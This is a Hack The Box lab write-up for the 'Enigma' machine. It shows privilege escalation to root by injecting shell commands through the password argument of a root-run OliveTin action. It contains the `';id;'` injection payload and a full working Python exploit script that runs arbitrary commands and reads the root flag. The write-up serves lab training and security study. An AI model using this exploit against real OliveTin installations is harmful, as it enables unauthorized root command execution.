# Hack The Box - Enigma

> **Difficulty:** Easy  
> **OS:** Linux  
> **Target:** enigma.htb  
> **Status:** Rooted

---

## Overview

This machine involved obtaining an initial shell as the `haris` user and then escalating privileges through a vulnerable OliveTin installation.

The important discovery was an OliveTin instance listening locally on port `1337`.

OliveTin was running as `root` and exposed a custom `Backup Database` action:

```text
Backup Database
    |
    +-- db_user
    +-- db_pass
    +-- db_name
```
The action executed:

mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql

The db_pass argument was a password-type argument and could be abused for shell metacharacter injection.

This allowed arbitrary commands to execute with the privileges of the OliveTin process.

Since OliveTin was running as root, this resulted in root command execution.

Attack Path
Initial foothold
      |
      v
haris user
      |
      v
Enumerate local services
      |
      v
OliveTin on 127.0.0.1:1337
      |
      v
Inspect /etc/OliveTin/config.yaml
      |
      v
Discover Backup Database action
      |
      v
OliveTin running as root
      |
      v
Shell injection through db_pass
      |
      v
Arbitrary command execution as root
      |
      v
/root/root.txt
1. Initial Foothold

The initial shell was obtained as:

haris

2. Enumerating OliveTin

First check whether OliveTin is running:

systemctl status OliveTin --no-pager

The service was active:

● OliveTin.service - OliveTin
     Loaded: loaded (/etc/systemd/system/OliveTin.service; enabled)
     Active: active (running)

Check the process
ps aux | grep -i '[o]livetin'

Output:

root 1546 ... /usr/local/bin/OliveTin

This is important because OliveTin is running as:

root

Therefore, if I can obtain command execution through OliveTin, those commands should execute as root.

Check the OliveTin version
/usr/local/bin/OliveTin --version 2>&1

Output:

version="3000.10.0"

OliveTin version:

3000.10.0

3. Find the Listening Port

Check listening TCP sockets:

ss -lntp | grep 1337

Output:

LISTEN 0 4096 127.0.0.1:1337 0.0.0.0:*

OliveTin was listening only on localhost:

127.0.0.1:1337

This means it wasn't directly exposed externally, but it was accessible from the existing shell on the machine.

4. Interact With OliveTin

Test the HTTP service:

curl -i http://127.0.0.1:1337/

This returned the OliveTin web interface.

Some obvious API paths were tested:

curl -i http://127.0.0.1:1337/api/
curl -i http://127.0.0.1:1337/api/actions
curl -i http://127.0.0.1:1337/openapi.json

These returned:

404 page not found

The application was using OliveTin's generated API rather than a conventional REST API layout.

5. OliveTin Configuration

The configuration file was readable:

ls -la /etc/OliveTin/

Output included:

-rw-r--r-- 1 root root ... config.yaml

Read the configuration:

cat /etc/OliveTin/config.yaml

The important action was:

- title: Backup Database
  id: backup_database
  icon: "⛁"
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  popupOnStart: execution-dialog
  arguments:
    - name: db_user
      type: ascii_identifier
      default: backup_svc
    - name: db_pass
      type: password
    - name: db_name
      type: ascii_identifier
      default: production

6. Understanding the Vulnerable Command

The intended command was:

mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql

Normally the password would be inserted into:

-p'PASSWORD'

The important parameter was:

db_pass

which was supplied by the user and placed directly inside a shell command.

The injection payload used was:

';<command>;'

For example:

';id;'

This changes the shell command structure so that id gets executed separately.

7. Reverse Engineering the OliveTin API

The OliveTin frontend showed that actions were sent through:

/api/olivetin.api.v1.OliveTinApiService/StartAction

The action used:

bindingId = backup_database

The relevant arguments were:

{
    "name": "db_user",
    "value": "backup_svc"
}
{
    "name": "db_pass",
    "value": "';id;'"
}
{
    "name": "db_name",
    "value": "production"
}
8. Working Exploit

The working exploit was saved as:

/tmp/exploit.py

Syntax was checked with:

python3 -m py_compile /tmp/exploit.py

No output indicated that the Python file compiled successfully.

exploit.py
import argparse
import json
import sys
import uuid
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def start_action(base_url, tracking_id, cmd):
    url = f"{base_url}/api/olivetin.api.v1.OliveTinApiService/StartAction"

    payload = {
        "bindingId": "backup_database",
        "arguments": [
            {
                "name": "db_user",
                "value": "backup_svc"
            },
            {
                "name": "db_pass",
                "value": f"';{cmd};'"
            },
            {
                "name": "db_name",
                "value": "production"
            }
        ],
        "uniqueTrackingId": tracking_id
    }

    r = requests.post(
        url,
        json=payload,
        verify=False,
        timeout=10,
    )

    r.raise_for_status()

    return r.json()["executionTrackingId"]


def execution_status(base_url, tracking_id):
    url = f"{base_url}/api/olivetin.api.v1.OliveTinApiService/ExecutionStatus"

    payload = {
        "executionTrackingId": tracking_id
    }

    r = requests.post(
        url,
        json=payload,
        verify=False,
        timeout=10,
    )

    r.raise_for_status()
    return r.json()


def print_output(resp):
    try:
        output = resp["logEntry"]["output"]
    except KeyError:
        print(json.dumps(resp, indent=4))
        return

    print("=" * 70)
    print("Command Output")
    print("=" * 70)
    print(output.rstrip())
    print("=" * 70)


def main():
    parser = argparse.ArgumentParser(
        description="OliveTin HTB PoC"
    )

    parser.add_argument(
        "-u",
        "--url",
        required=True,
        help="Target host/IP"
    )

    parser.add_argument(
        "-p",
        "--port",
        default=1337,
        type=int,
        help="Target port (default: 1337)"
    )

    parser.add_argument(
        "-x",
        "--cmd",
        default="id",
        help="Command to execute (default: id)"
    )

    args = parser.parse_args()

    host = args.url.rstrip("/")

    if not host.startswith("http://") and not host.startswith("https://"):
        host = "http://" + host

    base_url = f"{host}:{args.port}"

    tracking_id = str(uuid.uuid4())

    try:
        execution_id = start_action(base_url, tracking_id, args.cmd)

        print(f"[+] Execution ID: {execution_id}")
        time.sleep(2)

        response = execution_status(base_url, execution_id)

        print_output(response)

    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        sys.exit(1)

    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
9. Testing Command Execution

Run:

python3 /tmp/exploit.py -u 127.0.0.1

The default command is:

id

The important output was:

uid=0(root) gid=0(root) groups=0(root)

This confirmed arbitrary command execution as root.

10. Why the mysqldump Error Doesn't Matter

The output also contained:

exit status 2

and:

Usage: mysqldump [OPTIONS] database [tables]

and:

sh: 1: cannot create /opt/backups/backup.sql: Directory nonexistent

These errors are caused by the original command being malformed and the backup directory not existing.

They do not mean the exploit failed.

The important evidence is:

uid=0(root) gid=0(root) groups=0(root)

The injected command executed successfully before/alongside the broken mysqldump command.

11. Read the Root Flag

Once root command execution was confirmed, the root flag was retrieved with:

python3 /tmp/exploit.py -u 127.0.0.1 -x 'id; cat /root/root.txt'

Output included:

uid=0(root) gid=0(root) groups=0(root)

followed by the root flag.

[ROOT FLAG REDACTED]


12. Final Privilege Escalation Chain

The complete privilege escalation was:

haris
  |
  | Local enumeration
  v
OliveTin :1337
  |
  | /etc/OliveTin/config.yaml
  v
backup_database action
  |
  | db_pass inserted into shell command
  v
Command injection
  |
  | ';id;'
  v
OliveTin executes command
  |
  | OliveTin runs as root
  v
uid=0(root)
  |
  v
cat /root/root.txt
  |
  v
ROOT
13. Lessons Learned
Enumeration

Always check:

ss -lntp

for services listening only on localhost.

A service being bound to:

127.0.0.1

doesn't make it irrelevant after obtaining a shell.

Service privileges

Check who owns/runs interesting services:

ps aux | grep -i '[service]'

or:

systemctl status <service>

A vulnerable service running as root can turn a low-privileged application vulnerability into complete system compromise.

Configuration files

Readable configuration files can reveal:

Custom commands
Credentials
Service behavior
User-controlled parameters
Potential injection points

In this case:

/etc/OliveTin/config.yaml

revealed the exact shell command that eventually led to root.

Shell injection

Whenever user-controlled input is inserted into something like:

some-command '{{INPUT}}'

look for shell metacharacters such as:

;
'
"
$
&
|
>
<

The important question is:

Can I escape the intended argument and make the shell interpret my input as another command?

14. Useful Commands
OliveTin enumeration
systemctl status OliveTin --no-pager
ps aux | grep -i '[o]livetin'
/usr/local/bin/OliveTin --version 2>&1
ss -lntp | grep 1337
curl -i http://127.0.0.1:1337/
Configuration
ls -la /etc/OliveTin/
cat /etc/OliveTin/config.yaml
Exploit
python3 -m py_compile /tmp/exploit.py
python3 /tmp/exploit.py -u 127.0.0.1
python3 /tmp/exploit.py -u 127.0.0.1 -x 'id; whoami'
Root flag
python3 /tmp/exploit.py -u 127.0.0.1 -x 'id; cat /root/root.txt'
15. Result

User: haris

Privilege escalation: OliveTin command injection

Root execution:

uid=0(root) gid=0(root) groups=0(root)

Root flag: Obtained

Machine: enigma

Status: ✅ Rooted


---

## Commands/attempts I'd **not** put in the main attack path

I did have some exploratory/dead-end stuff. Keep these out of the main walkthrough or put them in a small **"Dead Ends / Troubleshooting"** section:

### ❌ These API paths returned 404

```bash
curl -i http://127.0.0.1:1337/api/
curl -i http://127.0.0.1:1337/api/actions
curl -i http://127.0.0.1:1337/openapi.json

Useful during investigation, but not part of the exploit.

❌ SSH tunneling didn't work

I tried:

ssh -L 1337:127.0.0.1:1337 haris@enigma.htb

but SSH authentication failed:

Permission denied (publickey).

So don't include this as a required step. I ultimately didn't need a tunnel because the exploit was run directly from the shell on the target:

python3 /tmp/exploit.py -u 127.0.0.1
❌ /opt/backupScript.sh

I checked for it, but it wasn't present. It wasn't necessary for the final exploit.

❌ tmux

I also tried using tmux, but the non-interactive shell gave:

open terminal failed: not a terminal

Again, completely irrelevant to the final root path.
